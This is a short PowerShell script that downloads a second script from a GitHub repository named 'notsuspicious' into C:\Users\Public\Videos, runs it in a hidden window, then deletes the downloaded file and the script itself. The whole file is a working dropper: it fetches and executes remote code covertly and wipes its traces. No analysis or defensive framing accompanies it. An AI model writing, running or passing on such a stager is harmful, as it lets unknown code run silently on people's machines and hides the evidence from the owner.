# Define the URL of the script to download
$url = "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1"

# Define the path to save the downloaded script
$scriptPath = "C:\Users\Public\Videos\downloader.ps1"

# Download the script content
Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing

# Execute the downloaded script silently
Start-Process powershell.exe -ArgumentList "-File $scriptPath" -WindowStyle Hidden -Wait

# Remove the downloaded script file
Remove-Item $scriptPath -Force

# Remove the current script file
Remove-Item $MyInvocation.MyCommand.Path -Force

pause
